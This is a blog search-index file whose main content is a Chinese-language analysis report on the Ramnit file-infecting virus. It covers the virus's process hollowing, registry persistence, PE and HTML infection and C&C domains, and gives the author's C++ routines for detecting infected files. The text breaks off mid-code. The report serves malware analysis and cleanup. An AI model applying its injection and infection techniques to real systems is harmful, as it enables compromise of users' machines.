<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="2020/09/12/hello-world/"/>
      <url>2020/09/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ramnit感染病毒分析报告</title>
      <link href="2019/11/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/"/>
      <url>2019/11/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<center><font size=7><b>Ramnit感染病毒分析报告</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>本文主要涵盖对Ramnit家族的3个变种（Ramnit.X，Ramnit.AS和Ramnit.A）的分析以及修复方案。其中Ramnit.X变种和Ramnit.AS变种感染文件的方式与之前分析的06—感染型病毒是一样的，所以本文将以Ramnit.A为主要分析对象来进行说明，并会说明Ramnit.A与Ramnit.X变种和Ramnit.AS变种的不同点。由于本文主要是对Ramnit家族的分析与修复方案，将不会特别细致的阐述每一个点，若想看更加详细的分析或想看Ramnit.X变种和Ramnit.AS变种的详细分析，可看Ramnit感染病毒分析报告02。</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">Ramnit变种名</th><th align="center">感染母体文件</th><th align="center">文件对应MD5</th></tr></thead><tbody><tr><td align="center">Ramnit.A</td><td align="center">WaterMark.exe</td><td align="center">BA4610E9CA3EBF61EC5800955A797C13</td></tr><tr><td align="center">Ramnit.X，AS</td><td align="center">DesktopLayer.exe</td><td align="center">FF5E1F27193CE51EEC318714EF038BEF</td></tr></tbody></table><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="病毒主体"><a href="#病毒主体" class="headerlink" title="病毒主体"></a>病毒主体</h2><h3 id="复制自身"><a href="#复制自身" class="headerlink" title="复制自身"></a>复制自身</h3><p>运行病毒样本后，会检索当前文件的路径，并判断该目录是否是<code>C:\Program File\Microsoft\</code>，若不是便将自身复制到该目录下，并执行该目录下的病毒母体文件，然后退出当前进程。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123105648286.png" alt="image-20191123105648286"></p><p>Ramnit.A变种与 Ramnit.X，AS 变种的不同点在于释放的感染母体文件不同，Ramnit.A变种释放名为<code>WaterMark.exe</code>， Ramnit.X，AS 变种释放名为 <code>DesktopLayer.exe</code> 。</p><h3 id="inline-Hook"><a href="#inline-Hook" class="headerlink" title="inline Hook"></a>inline Hook</h3><p>先将出主线程外的其他线程挂起，再对ntdll模块中的函数<code>ZwWriteVirtualMemory</code>进行Hook，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123111817606.png" alt="image-20191123111817606"></p><p>inline Hook的实现过程，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123111231623.png" alt="image-20191123111231623"></p><h3 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h3><p>由于之前Hook了函数<code>ZwWriteVirtualMemory</code>，恶意样本通过调用CreateProcess创建进程时，执行恶意样本自己写的Hookmain函数。</p><p>Hookmain函数主要行为是：往子进程中远程开辟虚拟空间，将PE文件展开并写入远程开辟的虚拟空间中，还写入3了个函数（修复IAT函数，修改区段属性函数，主行为逻辑函数），然后再修改子进程的入口点，从而创建傀儡进程，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123112513326.png" alt="image-20191123112513326"></p><p>Ramnit.A变种与 Ramnit.X，AS 变种的不同点</p><p><strong>Ramnit.A变种</strong></p><p>Ramnit.A变种Hook了两次<code>ZwWriteVirtualMemory</code>（分别进行了脱钩），并创建了两个Svchost.exe的傀儡进程，且注入的PE文件不是同一个文件，其中一个为感染傀儡进程，另一个简单看了一下维持进程当互斥体不在时，便遍历进程并注入所有进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123115437069.png" alt="image-20191123115437069"></p><p><strong>Ramnit.X，AS 变种</strong></p><p>Ramnit.X，AS 变种只Hook了一次，创建了一个浏览器（IE、Chrome等）傀儡进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123115608329.png" alt="image-20191123115608329"></p><h2 id="感染傀儡进程"><a href="#感染傀儡进程" class="headerlink" title="感染傀儡进程"></a>感染傀儡进程</h2><p>Ramnit.A变种创建了两个进程，其中只有一个是进行感染的，并且与Ramnit.X，AS 变种差不太多。</p><p>感染傀儡进程主要行为：</p><ul><li>创建线程1，将感染母体文件（WaterMark.exe或DesktopLayer.exe）添加到注册表Winlogon表中的userinit项中，使其开机自启。</li><li>创建线程2，与google、bing、Yahoo进行连接，获取时间，来记录样本运行了多长时间。</li><li>创建线程3，将线程2中获取的样本运行的时间，记录到文件dmlconf.dat 来记录样本运行了多长时间。</li><li>创建线程4，进行网络通信，按照一定时间，将获取到的数据发送到C&amp;C服务器 ==poopthree.com== 或 ==fget-career.com==。</li><li>感染PE文件和网页文件。</li></ul><p>感染傀儡进程的主要行为代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123120239592.png" alt="image-20191123120239592"></p><h3 id="添加自启动项"><a href="#添加自启动项" class="headerlink" title="添加自启动项"></a>添加自启动项</h3><p>将感染母体文件（WaterMark.exe或DesktopLayer.exe）添加到注册表Winlogon表中的userinit项中，使其开机自启。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123155112622.png" alt="image-20191123155112622"></p><h3 id="加工感染数据"><a href="#加工感染数据" class="headerlink" title="加工感染数据"></a>加工感染数据</h3><p>先读去感染母体的PE文件数据，然后根据函数<code>GetTickCount</code>获取到的自操作系统启动后的时间作为密钥，来加密感染母体PE文件数据，然后在将VBscript与加密后的感染母体PE文件进行拼接。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123151951744.png" alt="image-20191123151951744"></p><h3 id="感染固定介质"><a href="#感染固定介质" class="headerlink" title="感染固定介质"></a>感染固定介质</h3><p>遍历固定介质（硬盘），当磁盘大小大于512K时，开始遍历磁盘文件，通过匹配文件后缀名的方式，来判断要感染的文件。Ramnit.X，AS 变种和Ramnit.A变种都只感染4种文件后缀的文件，分别为：==.exe，.dll，.htm，.html==文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123142516691.png" alt="image-20191123142516691"></p><h4 id="感染PE文件"><a href="#感染PE文件" class="headerlink" title="感染PE文件"></a>感染PE文件</h4><h5 id="判断感染标志"><a href="#判断感染标志" class="headerlink" title="判断感染标志"></a>判断感染标志</h5><p>感染==.exe和.dll==文件，先判断感染标志是否存在。</p><p><code>Ramnit.A变种的感染标记</code>为文件附加数据的最后24个字节，通过将最后24个字节每4个字节与第一个4字节进行异或，然后与特定的值进行比较。将最后24个字节进行异或解密，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143147913.png" alt="image-20191123143147913"></p><p>与特定值进行比较，来判断文件是否被感染，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143208716.png" alt="image-20191123143208716"></p><p><code>Ramnit.X，AS 变种的感染标记</code>，遍历节表，查看文件是否有<code>rmnet</code>节，来判断文件是否被感染。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143908926.png" alt="image-20191123143908926"></p><h5 id="判断是否感染"><a href="#判断是否感染" class="headerlink" title="判断是否感染"></a>判断是否感染</h5><p>判断目标文件是否是32位程序，是否是.net，是否有签名，当不是32位程序，不是.net，没有签名时，便不感染，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123144112278.png" alt="image-20191123144112278"></p><h5 id="遍历目标文件OFTs表"><a href="#遍历目标文件OFTs表" class="headerlink" title="遍历目标文件OFTs表"></a>遍历目标文件OFTs表</h5><p>遍历目标文件的OFts表，获取LoadLibrary和GetProcAddr函数的FTs（IAT）的RVA，以及遍历导入表获取模块名为kernel32.dll的导入表位置，然后将获取到的RVA存到全局变量中，后面会跟着写入函数一同写到被感染文件中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123144750293.png" alt="image-20191123144750293"></p><h5 id="添加新节"><a href="#添加新节" class="headerlink" title="添加新节"></a>添加新节</h5><p>添加新区段，并设置感染区段的可读可写可执行属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123150704865.png" alt="image-20191123150704865"></p><p><code>Ramnit.A变种</code>添加的区段名为<code>.text</code>。</p><p><code>Ramnit.X，AS 变种</code>添加的区段名为<code>.rmnet</code>。</p><h5 id="修改OEP"><a href="#修改OEP" class="headerlink" title="修改OEP"></a>修改OEP</h5><p>先获取到目标文件的OEP，然后将==添加的新节RVA与OEP的差值存储在全局变量==中，后面会写入被感染的文件中，在将添加的新节的VA设置为新的OEP，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123150200713.png" alt="image-20191123150200713"></p><p><code>Ramnit.A变种的OEP</code>存储在感染区段偏移为 ==0x771== 的地址处。</p><p><code>Ramnit.X，AS 变种的OEP</code>存储在感染区段偏移为 ==0x328== 的地址处。</p><h5 id="写入加密后的感染母体及解密函数"><a href="#写入加密后的感染母体及解密函数" class="headerlink" title="写入加密后的感染母体及解密函数"></a>写入加密后的感染母体及解密函数</h5><p>由于之前将感染母体PE进行了加密处理，所以在感染的时候还需要将==解密函数==同==加密后的感染母体文件==同时写入被感染文件中去。下图中进行了两次写入，分别是写入解密函数，和加密后的感染母体文件（WaterMark或DesktopLayer），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123145649043.png" alt="image-20191123145649043"></p><h5 id="写入密钥和感染标志"><a href="#写入密钥和感染标志" class="headerlink" title="写入密钥和感染标志"></a>写入密钥和感染标志</h5><p>这里<code>Ramnit.A变种</code>就与 <code>Ramnit.X，AS 变种</code>不太一样了，<code>Ramnit.X，AS 变种</code>并没有这些操作。</p><p>之前在加工感染数据时提到过，<code>Ramnit.A变种</code>根据获取到的自操作系统启动的时间作为密钥，来加密感染母体PE文件，因此，<code>Ramnit.A变种</code>便将密钥经过加工写入被感染文件的附加数据中，也还会写入<code>Ramnit.A变种</code>的感染标志（文件末尾24字节），代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123152630234.png" alt="image-20191123152630234"></p><h5 id="修复文件"><a href="#修复文件" class="headerlink" title="修复文件"></a>修复文件</h5><p>修复文件校验和，文件时间以及文件属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123152742074.png" alt="image-20191123152742074"></p><p><code>Ramnit.A变种</code>会修复文件校验、修改时间和文件属性</p><p><code>Ramnit.X，AS 变种</code>只会修复文件校验和（但好像修复不成功）</p><h4 id="感染网页文件"><a href="#感染网页文件" class="headerlink" title="感染网页文件"></a>感染网页文件</h4><h5 id="判断感染标志-1"><a href="#判断感染标志-1" class="headerlink" title="判断感染标志"></a>判断感染标志</h5><p><code>Ramnit.A变种</code>的网页文件的感染标志与PE文件差不多，唯一区别为PE文件是直接读取最后24字节，而网页文件读取文件末尾倒数第27字节往后的24字节，其他的都一样，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153219238.png" alt="image-20191123153219238"></p><p><code>Ramnit.X，AS 变种</code>的网页感染标志为文件末尾的9个字节是否是<code>&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153344408.png" alt="image-20191123153344408"></p><h5 id="写入感染脚本"><a href="#写入感染脚本" class="headerlink" title="写入感染脚本"></a>写入感染脚本</h5><p><code>Ramnit.A变种</code>先写入感染脚本，再写入解密感染母体需要的密钥和感染标志，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153834055.png" alt="image-20191123153834055"></p><p><code>Ramnit.X，AS 变种</code>就相对简单，直接写入感染脚本</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153907994.png" alt="image-20191123153907994"></p><h5 id="修复文件-1"><a href="#修复文件-1" class="headerlink" title="修复文件"></a>修复文件</h5><p><code>Ramnit.A变种</code>会修复修改时间和文件属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123154122711.png" alt="image-20191123154122711"></p><p><code>Ramnit.X，AS 变种</code>对与网页文件并没有任何修复操作。</p><h3 id="感染可移动介质"><a href="#感染可移动介质" class="headerlink" title="感染可移动介质"></a>感染可移动介质</h3><p><code>Ramnit.A变种</code>和<code>Ramnit.X，AS 变种</code>对于可移动介质的感染操作，都是将恶意PE写入可移动介质的==autorun.inf==文件中，使当可移动介质插入计算机时自启动。</p><h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><strong>修复目标：</strong></p><ul><li>判断当前操作系统感染类型</li><li>关闭创建的傀儡进程svchost（<code>Ramnit.A变种</code>）和默认浏览器IE，chrome等（<code>Ramnit.X，AS 变种</code>），防止边修复遍感染。</li><li>删除感染母体文件，文件路径为<code>C:\Program File\Microsoft\</code>，目录下的感染母体文件WaterMark（<code>Ramnit.A变种</code>）或是DesktopLayer（<code>Ramnit.X，AS 变种</code>）</li><li>删除自启动项，修改注册表<code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></li><li>根据当前感染类型，修复.exe文件、.dll文件、.htm文件、.html文件</li></ul><h2 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h2><h3 id="判断文件是否被感染"><a href="#判断文件是否被感染" class="headerlink" title="判断文件是否被感染"></a>判断文件是否被感染</h3><p><code>Ramnit.A变种</code>对于.exe和.dll文件根据文件末尾最后24字节与特定特征去比较，对于.htm和.html文件根据文件倒数第27字节读取到的24字节与特征去比较，本人写的判断<code>Ramnit.A变种</code>是否被感染的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件末尾的感染特征  返回true，说明该文件被感染</span></span><br><span class="line"><span class="comment">//flag = 0 为PE判断</span></span><br><span class="line"><span class="comment">//flag = 3 为网页判断</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeCharacteristic</span><span class="params">(<span class="keyword">char</span> filename[MAX_PATH], <span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD Buffer[<span class="number">30</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">DWORD FileSizeHigh;</span><br><span class="line">DWORD characteristic = <span class="number">0xFA1BC352</span>;</span><br><span class="line">hfile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, &amp;FileSizeHigh);</span><br><span class="line"><span class="keyword">if</span> (filesize &gt; flag + <span class="number">24</span> &amp;&amp; filesize != <span class="number">-1</span> &amp;&amp; !FileSizeHigh)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - (flag + <span class="number">0x24</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">ReadFile(hfile, Buffer, <span class="number">0x24</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = Buffer[<span class="number">0</span>];; Buffer[j] ^= i)</span><br><span class="line">&#123;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">if</span> (!(j * <span class="number">4</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Buffer[<span class="number">1</span>] == characteristic &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">5</span> &amp;&amp; Buffer[<span class="number">3</span>] == <span class="number">0</span> &amp;&amp; Buffer[<span class="number">4</span>] == <span class="number">0x0D</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//返回true，说明该文件被感染</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//返回false，说明该文件没有被感染，或是不属于该文件类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败！&quot;</span>);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//文件大小不满足条件，没有被感染</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//文件打开失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Ramnit.X，AS 变种</code>的判断逻辑相对简单，对于.exe和.dll文件遍历PE文件的节表，查找是否有.rmnet节，若有便是被感染的，对于.htm和.html文件，则匹配最后9个字节的数据，本人写的代码(没有封装好)如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">对于.exe和.dll文件</span><br><span class="line"><span class="comment">//判断.rmnet节表是否存在 </span></span><br><span class="line"><span class="comment">//返回1，说明rmnet节存在</span></span><br><span class="line"><span class="comment">//返回0，说明rmnet节不存在</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* sectionName = (<span class="keyword">char</span>*)sectionHeader[numOfSection - <span class="number">1</span>].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(sectionName, <span class="string">&quot;.rmnet&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//返回1，说明rmnet节表存在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//返回0，说明节表不存在</span></span><br><span class="line">&#125;</span><br><span class="line">对于.htm和.html文件</span><br><span class="line"> FILE* fp;</span><br><span class="line"><span class="function">BOOL <span class="title">JudgeHtm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">fopen_s(&amp;fp,fileName, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">fseek(fp, <span class="number">-14</span>, SEEK_END);</span><br><span class="line">fread(buffer, <span class="number">14</span>, <span class="number">1</span>, fp);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(buffer, <span class="string">&quot;//--&gt;&lt;/SCRIPT&gt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//返回1，说明感染类型为Ramnit.x或Ramnit.AS</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//返回3，该文件没有被感染</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取原始OEP"><a href="#获取原始OEP" class="headerlink" title="获取原始OEP"></a>获取原始OEP</h3><p>根据<code>Ramnit.A变种的OEP</code>存储在感染区段偏移为 ==0x771== 的地址处。<code>Ramnit.X，AS 变种的OEP</code>存储在感染区段偏移为 ==0x328== 的地址处。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Ramnit.X，AS 变种的OEP</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetOEP</span><span class="params">()</span></span></span><br><span 